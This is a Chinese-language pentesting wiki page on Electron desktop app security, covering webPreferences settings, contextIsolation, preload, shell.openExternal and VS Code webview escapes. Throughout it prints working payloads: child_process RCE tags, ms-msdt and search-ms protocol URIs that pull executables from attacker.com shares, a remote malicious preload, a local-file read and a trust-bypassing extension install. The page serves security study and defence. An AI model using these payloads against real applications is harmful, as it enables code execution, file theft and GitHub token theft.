# Electron 桌面应用

{{#include ../../banners/hacktricks-training.md}}

## 简介

Electron 将具有特权的 **Node.js** 主进程与 **Chromium** 渲染进程结合起来。Electron 不是 Web 浏览器：应用代码可以有意开放文件系统和 shell 访问等功能，因此，与普通网站相比，加载不可信内容需要更严格的边界设计。<sup>[[21]](#references)</sup>

Electron 应用代码通常打包在 `.asar` 归档中。检查源代码前，请先将其解压：

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

应用的 `package.json` 会指定其主入口文件。该文件通常会创建 renderer 窗口，并设置其中对安全敏感的 `webPreferences`。

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron 有两种主要的进程类型：

- Main Process（可完全访问 NodeJS）
- Renderer Process（出于安全原因，应限制其对 NodeJS 的访问）

![Electron Desktop Apps - Introduction: Renderer Process（出于安全原因，应限制其对 NodeJS 的访问）](<../../images/image (182).png>)

**renderer process** 是一个加载文件的浏览器窗口：<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**主进程**会为每个渲染进程配置选项，通常是在构造 `BrowserWindow` 时进行配置。安全设置可以降低渲染进程遭到入侵后进一步实现原生代码执行的可能性，但无法让不可信内容本身变得安全。<sup>[[21]](#references)[[22]](#references)</sup>

至少检查以下渲染进程首选项：<sup>[[22]](#references)</sup>

- **`nodeIntegration`** 默认值为 `false`。启用后，渲染进程中的 JavaScript 可以访问 Node.js API，同时会禁用该渲染进程的沙箱。
- **`contextIsolation`** 默认值为 `true`。它会将页面的 JavaScript 上下文与 preload 脚本和 Electron 内部使用的上下文隔离开来。
- **`preload`** 默认没有路径。配置的 preload 脚本会在页面脚本之前运行，并可通过 `contextBridge` 暴露作用范围受限的 API。
- **`sandbox`** 自 Electron 20 起默认值为 `true`。它会限制渲染进程对操作系统资源的访问；设置 `nodeIntegration: true` 会禁用它。
- **`nodeIntegrationInWorker`** 默认值为 `false`，用于控制 Web Workers 中的 Node.js 集成。
- **`nodeIntegrationInSubFrames`** 默认值为 `false`。
  - 如果启用了 **`nodeIntegration`**，则 Electron 应用中 **iframe** 加载的网页可以使用 **Node.js API**。
  - 如果禁用了 **`nodeIntegration`**，preload 脚本仍会在 iframe 中加载。

配置示例：

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

一些来自 [此处](https://7as.es/electron/nodeIntegration_rce.txt) 的 **RCE payloads**：<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### 捕获流量

修改 start-main 配置，并添加使用代理的设置，例如：

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## 使用 REA 静态追踪 ASAR 到 native 的边界

**REA** 可以读取 ASAR 或解压后的应用目录，而无需执行其 JavaScript bootstrap。其应用图会记录 package 入口点、打包模块、`BrowserWindow` 和 preload 设置、`contextBridge` 成员、IPC 注册、native add-on 请求以及 source-map 标识。这为追踪 renderer 暴露的能力如何到达特权 main-process handler 提供了起点。<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

对于字面特征字符串，将完整的 Evidence 记录作为 `application` 传入，并将 seed 替换为在目标中观察到的值：<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

同一个 `trace_application_feature` 工作流也接受观测到的字面 API 成员、IPC 通道或模块作为种子。请根据返回的源代码位置检查生成的 handler 路径、验证候选项和 native 交接。renderer 的 `invoke` 只能与同一精确字面通道上唯一的 `ipcMain.handle`/`handleOnce` 候选项配对；`send` 同样需要唯一的 `ipcMain.on`/`once`/`addListener` 候选项。动态或重复的 handler 仍无法确定。请求的 `.node` 成员并不代表已验证的 native 导出；得出该结论前，匹配的 Hopper/Ghidra Evidence 必须具有相同的 artifact digest。静态可达性也不能证明该路径实际执行过。<sup>[[24]](#references)[[25]](#references)</sup>

有关 renderer 到 main 的信任边界和 handler 验证，请参见 [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md)。

有关面向 provider 的 native 后续分析，请参见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea)。

## Electron 自动更新攻击面

有关 release-feed 完整性、回滚、签名通道混淆和暂存文件 TOCTOU，请参见 [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md)。

## Electron 本地代码注入

如果可以对已安装的应用进行本地写入或插桩，请参见 [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md)，了解 ASAR/main-process 和 V8 snapshot 路径，以及特定于操作系统的链接。

## RCE：XSS + nodeIntegration

如果 **nodeIntegration** 设置为 **on**，网页的 JavaScript 只需调用 `require()`，就能轻松使用 Node.js 功能。例如，在 Windows 上执行 calc 应用的方式是：

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

此设置中指定的脚本会在 renderer 中的其他脚本之前**加载**，因此它可以**无限制访问 Node API**：

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

因此，该脚本可以将 node-features 导出到页面：

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **如果 `contextIsolation` 已启用，这种方法将不起作用**

## RCE：XSS + contextIsolation

_**contextIsolation**_ 会在**网页脚本与 Electron 内部代码的 JavaScript 之间创建隔离上下文**，使各自的代码执行不会相互影响。这是消除 RCE 可能性的必要功能。

如果上下文未隔离，攻击者可以：

1. 在 renderer 中执行**任意 JavaScript**（XSS 或导航到外部网站）
2. **覆盖内置方法**，该方法会在 preload 或 Electron 内部代码中使用，从而替换为自己的函数
3. **触发**对**被覆盖函数**的调用
4. RCE？

有两个位置可以覆盖内置方法：preload 代码或 Electron 内部代码：


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### 绕过点击事件

如果点击链接时有限制，你可以尝试**使用鼠标中键点击**，而不是常规的鼠标左键点击，以绕过这些限制。

```javascript
window.addEventListener('click', (e) => {
```

## 通过 shell.openExternal 实现 RCE

有关这些示例的更多信息，请查看 [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) 和 [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

部署 Electron 桌面应用时，确保 `nodeIntegration` 和 `contextIsolation` 设置正确至关重要。可以确定的是，启用这些设置后，针对 preload 脚本或主进程中 Electron 原生代码的**客户端远程代码执行 (RCE)** 实际上能够得到阻止。

用户与链接交互或打开新窗口时，会触发特定的事件监听器，这些监听器对应用程序的安全性和功能至关重要：

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

这些 listeners 会被 **desktop application 覆盖**，以实现其自身的 **业务逻辑**。应用会判断导航链接应在内部打开，还是在外部 web browser 中打开。通常通过 `openInternally` 函数做出这一判断。如果该函数返回 `false`，则表示应使用 `shell.openExternal` 函数在外部打开链接。

**以下是简化后的伪代码：**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS 安全最佳实践建议不要使用 `openExternal` 函数处理不受信任的内容，因为这可能通过各种 protocols 导致 RCE。操作系统支持可能触发 RCE 的不同 protocols。有关此主题的详细示例和进一步说明，请参阅[此资源](https://positive.security/blog/url-open-rce#windows-10-19042)，其中包含可用于利用此漏洞的 Windows protocol 示例。<sup>[[10]](#references)</sup>

在 macOS 中，可以利用 `openExternal` 函数执行任意命令，例如 `shell.openExternal('file:///System/Applications/Calculator.app')`。

**Windows protocol exploit 示例包括：**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + 有漏洞的 preload IPC + shell.openExternal

此漏洞可在**[这份报告](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**中找到。<sup>[[11]](#references)</sup>

**webviewTag** 是一项**已弃用的功能**，允许在 **renderer process** 中使用 **NodeJS**。应禁用此功能，因为它允许在 preload context 中加载脚本，例如：

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

因此，成功加载任意页面的攻击者可以利用该标签**加载任意预加载脚本**。

随后，这个预加载脚本被滥用来调用一个**存在漏洞的 IPC 服务（`skype-new-window`）**，该服务会调用 **`shell.openExternal`**，从而实现 RCE：

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## 读取内部文件：XSS + contextIsolation

**禁用 `contextIsolation` 后即可使用 `<webview>` 标签**，类似于 `<iframe>`，用于读取和外传本地文件。以下示例展示了如何利用此漏洞读取内部文件的内容：<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - 读取内部文件：XSS + contextIsolation：禁用 contextIsolation 后即可使用标签，类似于，用于...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

此外，还介绍了另一种**读取内部文件**的方法，指出 Electron 桌面应用中存在严重的本地文件读取漏洞。此方法通过注入脚本来利用应用并外传数据：

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Old Chromium**

如果应用捆绑的 **Chromium** 版本较旧且存在已知漏洞，就可能利用这些漏洞，将 XSS 转化为 RCE。<sup>[[20]](#references)</sup>\
你可以在这篇 **writeup** 中查看示例：[https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **通过绕过内部 URL 正则表达式进行 XSS Phishing**

如果你发现了 XSS，但**无法触发 RCE 或窃取内部文件**，仍可以尝试**通过钓鱼窃取凭据**。<sup>[[1]](#references)</sup>

首先，检查前端代码，确定打开新 URL 时会发生什么：

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

对 **`openInternally`** 的调用决定了平台链接是在 **桌面窗口** 中打开，还是由系统浏览器打开第三方资源。

如果能够绕过函数的 URL allowlist regex（例如，因为主机名中的点号未转义），攻击者就可以利用 XSS，在攻击者控制的基础设施上打开一个足以以假乱真的凭据提示：

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` 协议

如[Electron 安全指南](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols)中所述，运行在 **`file://`** 上的页面具有广泛的文件访问权限。因此，**XSS 可能被用于加载**用户机器上的任意文件。设计得当的**自定义协议**可以将访问限制在特定文件范围内。<sup>[[21]](#references)</sup>

## Remote 模块

Electron Remote 模块允许**渲染进程访问主进程 API**，从而促进 Electron 应用内的通信。不过，启用该模块会带来显著的安全风险。它会扩大应用的攻击面，使其更容易受到跨站脚本（XSS）攻击等漏洞的影响。

> [!TIP]
> 尽管 **remote** 模块会向渲染进程公开主进程中的某些 API，但仅仅滥用这些组件并不容易实现 RCE。不过，这些组件可能会暴露敏感信息。

> [!WARNING]
> 许多仍在使用 remote 模块的应用，其使用方式**要求在渲染进程中启用 NodeIntegration**，这会带来**极大的安全风险**。

Electron 内置的 `remote` 模块已弃用并随后移除；仍需使用其模式的应用可以使用独立的 `@electron/remote` 包。考虑到安全和性能方面的影响，应避免向不受信任的渲染进程暴露类似 remote 的功能。

使用 `@electron/remote` 时，必须先在**主进程中初始化**：

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

随后，renderer 进程便可从该模块导入对象：

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[博客文章](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** 指出了 remote 模块中的对象 **`app`** 所暴露的一些有趣的**函数**：<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - 通过**退出**当前实例并**启动**一个新实例来**重启**应用程序。适用于**应用更新**或重要的**状态变更**。
- **`app.setAppLogsPath([path])`**  
   - **指定**或**创建**用于存储**应用日志**的目录。可使用 **`app.getPath()`** 或 **`app.setPath(pathName, newPath)`** **检索**或**修改**日志路径。
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - 将当前可执行文件**注册**为指定**协议**的**默认处理程序**。如有需要，可以提供**自定义路径**和**参数**。
- **`app.setUserTasks(tasks)`**  
   - 将任务**添加**到（Windows 上）Jump List 的 **Tasks 类别**中。每个任务都可以控制应用程序的**启动方式**或传入的**参数**。
- **`app.importCertificate(options, callback)`**  
   - 将 **PKCS#12 证书**导入系统的**证书存储区**（仅限 Linux）。可以使用 **callback** 处理结果。
- **`app.moveToApplicationsFolder([options])`**  
   - 将应用程序**移至**（macOS 上的）**Applications 文件夹**。有助于确保 Mac 用户获得**标准安装**。
- **`app.setJumpList(categories)`**  
   - 在 **Windows** 上**设置**或**移除**自定义 **Jump List**。你可以指定**类别**来组织任务向用户显示的方式。
- **`app.setLoginItemSettings(settings)`**  
   - **配置**登录时启动的**可执行文件**及其**选项**（仅限 macOS 和 Windows）。
  
示例：

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences 模块

用于访问系统偏好设置和**触发系统事件**的**主要 API**。**subscribeNotification**、**subscribeWorkspaceNotification**、**getUserDefault** 和 **setUserDefault** 等方法都**属于**此模块。

**用法示例：**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **监听**使用 NSDistributedNotificationCenter 的 **macOS 原生通知**。  
* 在 **macOS Catalina** 之前，可以向 CFNotificationCenterAddObserver 传入 **nil**，以嗅探**所有**分布式通知。  
* 在 **Catalina / Big Sur** 之后，沙盒应用仍可通过按**名称**注册通知，**订阅**许多事件（例如**屏幕锁定/解锁**、**卷挂载**、**网络活动**等）。

### **getUserDefault / setUserDefault**

* 与 **NSUserDefaults** 交互；它用于在 macOS 上存储**应用**或**全局**偏好设置。
    
* **getUserDefault** 可以获取敏感信息，例如**最近使用的文件位置**或**用户的地理位置**。
    
* **setUserDefault** 可以修改这些偏好设置，从而可能影响应用的**配置**。
    
* 在较旧的 Electron 版本中（v8.3.0 之前），只能访问 NSUserDefaults 的 **standard suite**。

## Shell.showItemInFolder

此函数会在文件管理器中显示指定文件。在受影响的平台和版本中，这种交互**可能会自动执行该文件**。

更多信息请参阅 [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## 内容安全策略

Electron 应用应设置 **内容安全策略（CSP）**，以**防止 XSS 攻击**。**CSP** 是一项**安全标准**，有助于防止浏览器**执行**不受信任的代码。

它通常在 **`main.js`** 文件或 **`index.html`** 模板中配置，并将 CSP 放在 **meta 标签**内。

更多信息请参阅：


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE：Webview CSP + postMessage 信任 + 本地文件加载（VS Code 1.63）

这个真实案例影响了 Visual Studio Code 1.63（CVE-2021-43908），展示了在 CSP、postMessage 和 scheme handler 配置不当时，如何将 webview 中由 Markdown 驱动的单个 XSS 升级为完整 RCE。公开 PoC：https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

攻击链概述
- 首次 XSS（通过 webview CSP）：生成的 CSP 包含 `style-src 'self' 'unsafe-inline'`，允许在 `vscode-webview://` 上下文中进行基于内联样式的注入。该 payload 向 `/stealID` 发送信标，以窃取目标 webview 的 extensionId。
- 构造目标 webview URL：使用 leaked ID 构造 `vscode-webview://<extensionId>/.../<publicUrl>`。
- 二次 XSS（通过 postMessage 信任）：外层 webview 在未严格检查 origin/type 的情况下信任 `window.postMessage`，并加载启用了 `allowScripts: true` 的攻击者 HTML。
- 通过 scheme/path 重写加载本地文件：该 payload 将 `file:///...` 重写为 `vscode-file://vscode-app/...`，并将 `exploit.md` 替换为 `RCE.html`，利用薄弱的路径验证加载特权本地资源。
- 在启用 Node 的上下文中实现 RCE：加载的 HTML 可使用 Node API 执行，从而实现操作系统命令执行。

最终上下文中的 RCE 原语示例
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

与 postMessage 信任问题相关的阅读：

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev：合成 webview 快捷键 + 声明式扩展命令桥接

2026 年 6 月出现了另一类 VS Code webview 逃逸：**notebook/preview webview 中的不可信 JavaScript 可以合成具有特权的全局快捷键**，因为 webview preload 会将 `keydown` 数据转发给宿主 workbench，而宿主会将其当作真实用户输入处理。<sup>[[14]](#references)</sup>

这属于 IDE 信任边界攻击的更广泛历史的一部分：由项目控制的内容会触达具有特权的编辑器功能。<sup>[[19]](#references)</sup>

### 边界失效

如果跨源/沙箱化的 webview 将攻击者控制的键盘字段（`key`、`code`、`keyCode`、修饰键、`repeat`）复制到具有特权的 `postMessage`/message-port 桥接中，**却不检查 `event.isTrusted`**，那么 webview 中的 JavaScript 就可以执行 workbench 快捷键：<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

当浏览器**阻止合成输入**时，这尤其有用。脚本化按键事件通常**无法将任意文本输入 HTML `<input>` 元素**，但仍能触发直接处理 `keydown` 的快捷键。

### 实际滥用模式

- **针对快捷键的 UI 滥用：**利用全局快捷键，例如通知确认、面板导航、激活焦点按钮或菜单移动，而不是尝试输入命令。
- **利用工作区元数据触发可预测的特权提示：**由仓库控制的 `.vscode/extensions.json` 可以推荐攻击者扩展，并生成可通过 `Ctrl+Shift+A` 等快捷键确认的可预测安装通知。
- **将声明式扩展清单用作命令桥接：**即使 CSP 在 Web 版 VS Code 中阻止了本地工作区扩展代码，声明式的 `package.json` 配置仍可能加载。`.vscode/extensions` 下的本地扩展可以注册一个调用 `runCommands` 的快捷键绑定，继而调用特权内部命令，例如 `workbench.extensions.installExtension`。<sup>[[14]](#references)[[18]](#references)</sup>

示例清单模式：

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **可通过不可信元数据触达的隐藏安全标志：**如果内部命令接受攻击者控制的参数，例如 `{"context":{"skipPublisherTrust":true}}`，声明式元数据就能绕过信任对话框，并安装托管在 Marketplace/CDN 上的扩展，最终执行攻击者代码。
- **滥用受信任的工作区：**如果远程/网页工作区会自动获得信任，本地工作区扩展就会成为从仓库内容触达特权编辑器操作的高价值桥梁。
- **扩大失陷后的影响范围：**扩展执行后，检查编辑器向扩展开放了哪些令牌。在 `github.dev` 中，被窃取的 GitHub 令牌不仅对已打开的仓库有效，因此攻击者可以查询 `https://api.github.com/user/repos`，枚举其他可访问的私有仓库。

### 审计注意事项

- 将 **webview 到 host 的输入转发**视为特权边界；绝不要把来自不可信框架的合成按键/点击事件重新分发到 host。
- 在敏感命令内部实施授权。不要接受调用方提供的命令上下文，使其能够设置 `skipPublisherTrust` 等内部标志。
- 不要认为阻止可执行的本地扩展代码就足够了；还要审查由工作区控制的清单中的**声明式贡献**（`keybindings`、`menus`、`commands`、tasks）。
- 2026 年 6 月 3 日的修复为转发的事件添加了 `isTrusted`，禁用了 notebook webview 中不可信的按键转发，并停止接受调用方提供的安装命令上下文。<sup>[[16]](#references)[[17]](#references)</sup>

## **工具**

精选的 **awesome-electronjs-hacking** 合集提供了更多研究资料、工具和易受攻击应用资源。<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) 是一款用于识别基于 Electron 的应用中的错误配置和安全反模式的工具。
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) 是一款用于 Electron 应用的开源 VS Code 插件，使用 Electronegativity。
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) 用于检查有漏洞的第三方库。
- [**Electro.ng**](https://electro.ng/) 是一款商用 Electron 安全分析工具。

## 实验环境

在 [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) 中可以找到一个用于利用有漏洞 Electron 应用的实验环境。<sup>[[4]](#references)</sup>

以下命令可以帮助你完成实验：

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

现有书签此前发布的地址：[Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。整个页面的路由会重定向到此处；历史片段不再维护。

## References

- [1] [Electron 应用中的 Phishing 和凭据收集](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App 任意文件读取](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron：滥用缺少 context isolation 的问题 - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [利用 XSS 和 RCE 攻击现代桌面应用 Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js 安全与不安全相关资源精选列表](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron APIs 滥用：攻击者的首选](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron 应用中的一键式 RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron 的 shell.openExternal() 的危险——通往远程代码执行的多条路径](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [允许任意 URL，就要预期任意代码执行](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [利用过时的 Electron 功能，在知名日本聊天工具中实现 RCE](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - 受限模式下的远程代码执行 (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [通过 VS Code Webview 键盘事件注入，一键窃取 GitHub Token](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593：Webview 可以在主工作台中触发任意键盘快捷键](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705：打开 notebook 时进行确认，并停止接受调用方提供的 installExtension 上下文](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813：阻止 notebook webview 中以编程方式重新分发 webview 按键/点击事件](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / 本地 workspace 扩展](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom：我如何在 2 周内攻破所有主流 IDE](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt：攻破热门桌面应用，同时揭示 Electron 的新攻击面](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron 安全](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA：逆向分析一切](https://github.com/morluto/rea)
- [24] [REA JavaScript artifact 重建](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA 跨层 JavaScript 应用工作流](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
